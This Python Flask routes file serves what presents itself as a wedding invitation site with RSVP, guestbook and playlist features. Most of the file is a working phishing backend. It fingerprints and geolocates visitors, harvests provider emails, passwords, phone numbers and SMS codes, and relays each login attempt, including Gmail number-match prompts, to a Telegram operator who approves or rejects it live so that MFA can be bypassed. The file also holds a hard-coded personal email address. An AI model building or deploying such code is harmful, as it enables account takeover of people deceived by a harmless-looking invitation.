import os
import random
import string
import time
import requests
from datetime import datetime
from flask import request, jsonify, send_from_directory


def register_routes(app, telegram_service, rsvps, guestbook, playlist, logs, active_login_attempts):
    @app.route("/api/rsvps", methods=["GET"])
    def get_rsvps():
        return jsonify(rsvps)

    @app.route("/api/rsvps", methods=["POST"])
    def post_rsvp():
        data = request.json or {}
        name = data.get("name")
        email = data.get("email")
        if not name or not email:
            return jsonify({"error": "Name and Email are required."}), 400
        
        attending = data.get("attending")
        is_attending = attending is True or attending == "true" or attending == "True"
        guests_count = int(data.get("guestsCount") or 0)
        if is_attending and guests_count == 0:
            guests_count = 1
            
        new_rsvp = {
            "id": "rsvp-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "name": name,
            "email": email,
            "attending": is_attending,
            "guestsCount": guests_count,
            "dietaryRestrictions": data.get("dietaryRestrictions") or "None",
            "notes": data.get("notes") or "",
            "createdAt": datetime.utcnow().isoformat() + "Z"
        }
        
        rsvps.insert(0, new_rsvp)
        
        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_rsvp_alert(new_rsvp)
                except Exception as e:
                    print(f"Failed to send RSVP alert to Telegram: {e}", flush=True)
            import threading
            threading.Thread(target=send_alert).start()
            
        log_id = "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
        logs.insert(0, {
            "id": log_id,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "RSVP_SUBMITTED",
            "details": f"RSVP registered for {name} ({'Attending' if is_attending else 'Not Attending'}, {guests_count} guests).",
            "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        })
        
        return jsonify(new_rsvp), 201

    @app.route("/api/guestbook", methods=["GET"])
    def get_guestbook():
        return jsonify(guestbook)

    @app.route("/api/guestbook", methods=["POST"])
    def post_guestbook():
        data = request.json or {}
        author = data.get("author")
        message = data.get("message")
        if not author or not message:
            return jsonify({"error": "Author and Message are required."}), 400
            
        colors = [
          "bg-rose-100 text-rose-700",
          "bg-pink-100 text-pink-700",
          "bg-amber-100 text-amber-700",
          "bg-purple-100 text-purple-700",
          "bg-emerald-100 text-emerald-700",
          "bg-sky-100 text-sky-700"
        ]
        random_color = random.choice(colors)
        
        entry = {
            "id": "msg-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "author": author,
            "message": message,
            "avatarColor": random_color,
            "createdAt": datetime.utcnow().isoformat() + "Z"
        }
        guestbook.insert(0, entry)
        return jsonify(entry), 201

    @app.route("/api/playlist", methods=["GET"])
    def get_playlist():
        return jsonify(playlist)

    @app.route("/api/playlist", methods=["POST"])
    def post_playlist():
        data = request.json or {}
        title = data.get("title")
        artist = data.get("artist")
        requested_by = data.get("requestedBy") or "Secret Guest"
        if not title or not artist:
            return jsonify({"error": "Title and Artist are required."}), 400
            
        song = {
            "id": "song-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "title": title,
            "artist": artist,
            "requestedBy": requested_by,
            "votes": 1
        }
        playlist.append(song)
        return jsonify(song), 201

    @app.route("/api/playlist/upvote", methods=["POST"])
    def upvote_song():
        data = request.json or {}
        song_id = data.get("id")
        for s in playlist:
            if s["id"] == song_id:
                s["votes"] += 1
                return jsonify(s)
        return jsonify({"error": "Song not found."}), 404

    @app.route("/api/logs", methods=["GET"])
    def get_logs():
        return jsonify(logs)

    @app.route("/api/logs", methods=["POST"])
    def post_simulation_log():
        data = request.json or {}
        log_type = data.get("type")
        details = data.get("details")
        new_log = {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": log_type,
            "details": details,
            "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        }
        logs.insert(0, new_log)
        return jsonify(new_log)

    @app.route("/api/telegram/visitor_entry", methods=["POST"])
    def visitor_entry():
        pass
        try:
            client_body = request.json or {}
            
            # Extract IP
            ip = ""
            forwarded = request.headers.get("X-Forwarded-For")
            if forwarded:
                ip = forwarded.split(",")[0].strip()
            else:
                ip = request.remote_addr or "127.0.0.1"
                
            if ip.startswith("::ffff:"):
                ip = ip[7:]
                
            resolved_loc = {
                "city": "Unknown",
                "region": "Unknown",
                "country_name": "Unknown",
                "country_code": "??",
                "org": "Unknown"
            }
            
            is_local_ip = (
                not ip or 
                ip == "::1" or 
                ip == "127.0.0.1" or 
                ip.startswith("10.") or 
                ip.startswith("192.168.") or 
                ip.startswith("172.")
            )
            
            if is_local_ip:
                try:
                    res = requests.get("https://ipwho.is/", timeout=3)
                    if res.status_code == 200:
                        data = res.json()
                        if data and data.get("success") is not False:
                            resolved_loc = {
                                "city": data.get("city") or "Unknown",
                                "region": data.get("region") or "Unknown",
                                "country_name": f"{data.get('country') or 'Unknown'} (Server Host Node)",
                                "country_code": data.get("country_code") or "??",
                                "org": data.get("connection", {}).get("org") or data.get("connection", {}).get("isp") or "Unknown"
                            }
                except Exception:
                    resolved_loc = {
                        "city": "Local Sandbox",
                        "region": "Internal Platform",
                        "country_name": "Localhost Developer Loopback",
                        "country_code": "US",
                        "org": "Gateway Dev Network"
                    }
            else:
                fetched = False
                # 1. ipwho.is lookup
                try:
                    res = requests.get(f"https://ipwho.is/{ip}", timeout=3)
                    if res.status_code == 200:
                        data = res.json()
                        if data and data.get("success") is not False:
                            resolved_loc = {
                                "city": data.get("city") or "Unknown",
                                "region": data.get("region") or "Unknown",
                                "country_name": data.get("country") or "Unknown",
                                "country_code": data.get("country_code") or "??",
                                "org": data.get("connection", {}).get("org") or data.get("connection", {}).get("isp") or "Unknown"
                            }
                            fetched = True
                except Exception as e:
                    print(f"[Server Geolocation] ipwho.is server-side lookup failed: {e}", flush=True)
                    
                # 2. fallback freeipapi.com
                if not fetched:
                    try:
                        res = requests.get(f"https://freeipapi.com/api/json/{ip}", timeout=3)
                        if res.status_code == 200:
                            data = res.json()
                            resolved_loc = {
                                "city": data.get("cityName") or "Unknown",
                                "region": data.get("regionName") or "Unknown",
                                "country_name": data.get("countryName") or "Unknown",
                                "country_code": data.get("countryCode") or "??",
                                "org": "Unknown"
                            }
                            fetched = True
                    except Exception as e:
                        print(f"[Server Geolocation] freeipapi server-side lookup failed: {e}", flush=True)
                        
            # Synthesize complete telemetry visitor object
            visitor = {
                "ip": ip,
                "city": resolved_loc["city"],
                "region": resolved_loc["region"],
                "country_name": resolved_loc["country_name"],
                "country_code": resolved_loc["country_code"],
                "org": resolved_loc["org"],
                "browser": client_body.get("browser") or "Unknown Browser",
                "os": client_body.get("os") or "Unknown OS",
                "screenSize": client_body.get("screenSize") or "Unknown",
                "language": client_body.get("language") or "Unknown",
                "timezone": client_body.get("timezone") or "Unknown",
                "cores": client_body.get("cores") or "Unknown",
                "platform": client_body.get("platform") or "Unknown",
                "userAgent": client_body.get("userAgent") or "Unknown"
            }
            
            loc_str = ", ".join(filter(None, [visitor["city"], visitor["region"], visitor["country_name"]]))
            browser_str = f"{visitor['browser']} ({visitor['os']})"
            log_details = f"[VISITOR ACCESS] New Guest entered. IP: {visitor['ip']} | Location: {loc_str or 'Unknown'} | Browser: {browser_str}"
            
            logs.insert(0, {
                "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "type": "PAGE_VIEW",
                "details": log_details,
                "ipPlaceholder": visitor["ip"]
            })
            
            if telegram_service.is_configured():
                def send_alert():
                    try:
                        telegram_service.send_visitor_alert(visitor)
                    except Exception as e:
                        print(f"Failed to send visitor alert to Telegram: {e}", flush=True)
                import threading
                threading.Thread(target=send_alert).start()
                
            return jsonify({"success": True, "visitor": visitor})
        except Exception as e:
            print(f"Visitor entry log transmission failure: {e}", flush=True)
            return jsonify({"error": str(e)}), 500

    @app.route("/api/telegram/config", methods=["GET"])
    def telegram_config():
        return jsonify(telegram_service.get_config())

    @app.route("/api/telegram/send_test", methods=["POST"])
    def send_test_message():
        try:
            if not telegram_service.is_configured():
                return jsonify({"error": "Telegram bot accounts are not configured yet."}), 400
                
            data = request.json or {}
            test_email = data.get("testEmail") or "showolesheriff7@gmail.com"
            
            message = f"""
🔔 <b>Invitation Gateway Handshake Active!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
This is a high-fidelity authorization check from your wedding gateway applet.
Your real-time connection is <b>ONLINE</b> and functional!

👤 <b>Host Receiver Account:</b> <code>{test_email}</code>
📍 <b>Service Node:</b> Port 3000 (Python Flask proxy)
━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Ready to process remote action overrides!</i>
            """.strip()
            
            telegram_service.send_message(message, "HTML")
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/api/telegram/send_text", methods=["POST"])
    def send_text_to_telegram():
            data = request.json or {}
            text = data.get("text")
            if not text:
                return jsonify({"error": "'text' field is required."}), 400
            if not telegram_service.is_configured():
                return jsonify({"error": "Telegram bot is not configured."}), 400

            def send():
                try:
                    telegram_service.send_message(text, "HTML")
                except Exception as e:
                    print(f"Failed to send text to Telegram: {e}", flush=True)

            import threading
            threading.Thread(target=send).start()
            return jsonify({"success": True})

    @app.route("/api/telegram/login_attempt", methods=["POST"])
    def login_attempt():
        data = request.json or {}
        provider = data.get("provider")
        email = data.get("email")
        password = data.get("password")
        # For Gmail, server will generate number-match candidates and wait for host selection.
        prompt_number = data.get("promptNumber")
        
        if not provider or not email:
            return jsonify({"error": "Missing required login attempt parameters: provider and email."}), 400
            
        attempt_id = "attempt-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
        new_attempt = {
            "id": attempt_id,
            "provider": provider,
            "email": email,
            "password": password or "",
            "promptNumber": None,
            "promptCandidates": None, # 👈 Starts as None
            "status": "pending",
            "timestamp": datetime.utcnow().isoformat() + "Z"
            }
        
        active_login_attempts[attempt_id] = new_attempt
        
        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[{provider.upper()}] Auth request submitted for {email} (Password: \"{password or ''}\"). Dispatched to Telegram (Attempt ID: {attempt_id}).",
            "ipPlaceholder": client_ip
        })
        
        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_login_alert(new_attempt)
                except Exception as e:
                    print(f"Failed to deliver login alert to Telegram: {e}", flush=True)
            import threading
            threading.Thread(target=send_alert).start()
            
        return jsonify(new_attempt)

    @app.route("/api/telegram/otp_attempt", methods=["POST"])
    def otp_attempt():
        data = request.json or {}
        attempt_id = data.get("id")
        phone = data.get("phone")
        sms_code = data.get("smsCode")
        
        if not attempt_id:
            return jsonify({"error": "id parameter is required."}), 400
            
        state = active_login_attempts.get(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404
            
        if phone is not None:
            state["phone"] = phone
        if sms_code is not None:
            state["smsCode"] = sms_code
            
        state["status"] = "pending"
        
        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[{state['provider'].upper()}] OTP/OTP submission from guest: Phone: \"+1 {phone or ''}\", Code: \"{sms_code or ''}\". Re-dispatched inline action alert...",
            "ipPlaceholder": client_ip
        })
        
        if telegram_service.is_configured():
            def send_alert():
                try:
                    telegram_service.send_sms_submit_alert(state)
                except Exception as e:
                    print(f"Failed to deliver OTP alert to Telegram: {e}", flush=True)
            import threading
            threading.Thread(target=send_alert).start()
            
        return jsonify(state)

    @app.route("/api/telegram/send_candidates", methods=["POST"])
    def send_candidates():
        """
        Test helper: accept { id, candidates: [n1,n2,n3] } and apply to the attempt.
        This simulates the host selecting up to 3 numbers from the 1..100 keyboard in Telegram.
        """
        data = request.json or {}
        attempt_id = data.get("id")
        candidates = data.get("candidates")

        if not attempt_id or not candidates:
            return jsonify({"error": "Missing parameters: id and candidates are required."}), 400

        if not isinstance(candidates, list) or len(candidates) == 0:
            return jsonify({"error": "'candidates' must be a non-empty list of numbers."}), 400

        state = active_login_attempts.get(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404

        # sanitize and take up to 3 numeric candidates
        nums = []
        try:
            for n in candidates:
                if len(nums) >= 3:
                    break
                nums.append(int(n))
        except Exception:
            return jsonify({"error": "Candidates must be numeric values."}), 400

        state["promptCandidates"] = [int(x) for x in nums]
        state["status"] = "number_prompt"

        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[TEST ROUTE] Host-supplied prompt candidates {nums} for {state.get('email')}",
            "ipPlaceholder": request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        })

        # Optionally notify guest-facing clients via telegram_service if configured
        try:
            if telegram_service.is_configured():
                telegram_service.send_message(f"Host supplied prompt candidates for attempt {attempt_id}: {nums}")
        except Exception as e:
            print(f"Failed to notify via Telegram about test candidates: {e}", flush=True)

        return jsonify(state)

    @app.route("/api/telegram/prompt_choice", methods=["POST"])
    def prompt_choice():
        data = request.json or {}
        attempt_id = data.get("id")
        chosen = data.get("chosen")

        if not attempt_id or chosen is None:
            return jsonify({"error": "Missing parameters: id and chosen are required."}), 400

        state = active_login_attempts.get(attempt_id)
        if not state:
            return jsonify({"error": "Active transaction attempt was not found."}), 404

        # Record guest's selection
        state["promptNumber"] = str(chosen)
        state["status"] = "pending"

        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "127.0.0.1").split(",")[0].strip()
        logs.insert(0, {
            "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "type": "GATEWAY_LOGIN_ATTEMPT",
            "details": f"[GUEST CHOICE] Guest selected number {chosen} for {state.get('email')}. Notified host via Telegram.",
            "ipPlaceholder": client_ip
        })

        # Notify host via Telegram with approve/deny inline actions
        if telegram_service.is_configured():
            def send_alert():
                try:
                    message = f"📣 <b>Guest Selection Received</b>\n━━━━━━━━━━━━━━━━━━\nGuest: <code>{state.get('email')}</code>\nSelected number: <code>{chosen}</code>\nAttempt ID: <code>{attempt_id}</code>\n━━━━━━━━━━━━━━━━━━\nApprove or reject the selection using the buttons below."
                    inline_keyboard = {
                        "inline_keyboard": [
                            [
                                {"text": "Approve ✅", "callback_data": f"tg:approve:{attempt_id}"},
                                {"text": "Reject ❌", "callback_data": f"tg:deny:{attempt_id}"}
                            ],
                            [
                                {"text": "Incorrect Password ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                            ]
                        ]
                    }
                    telegram_service.send_message(message, "HTML", inline_keyboard)
                except Exception as e:
                    print(f"Failed to notify Telegram of guest choice: {e}", flush=True)
            import threading
            threading.Thread(target=send_alert).start()

        return jsonify(state)

    @app.route("/api/telegram/attempt_status", methods=["GET"])
    def attempt_status():
        attempt_id = request.args.get("id")
        if not attempt_id:
            return jsonify({"error": "Transaction 'id' parameter is required for status checks."}), 400
            
        state = active_login_attempts.get(attempt_id)
        if not state:
            return jsonify({"error": "Requested auth transaction not found."}), 404
            
        return jsonify(state)

    @app.route("/api/telegram/attempts", methods=["GET"])
    def get_attempts():
        attempts_list = list(active_login_attempts.values())
        attempts_list.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
        return jsonify(attempts_list[:10])

    @app.route("/api/telegram/local_override", methods=["POST"])
    def local_override():
        data = request.json or {}
        attempt_id = data.get("id")
        status = data.get("status")
        
        if not attempt_id or not status:
            return jsonify({"error": "Missing parameters: id and status are required."}), 400
            
        attempt = active_login_attempts.get(attempt_id)
        if attempt:
            attempt["status"] = status
            
            logs.insert(0, {
                "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "type": "LOGIN_SUCCESS" if status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
                "details": f"[LOCAL OVERRIDE] Coordinator manually authorized remote action [{status.upper()}] for guest {attempt.get('email')}.",
                "ipPlaceholder": "Host Console"
            })
            return jsonify({"success": True, "attempt": attempt})
            
        return jsonify({"error": "Requested sign-in transaction attempt not found."}), 404

    # --- VITE ASSET / SPA SERVING ROUTE ---
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def serve(path):
        if path.startswith('api/'):
            return jsonify({"error": "Endpoint not found."}), 404
            
        # Check if file exists in dist directory
        full_path = os.path.join('dist', path)
        if path and os.path.exists(full_path) and os.path.isfile(full_path):
            return send_from_directory('dist', path)
            
        # Standard SPA fallback routing
        return send_from_directory('dist', 'index.html')
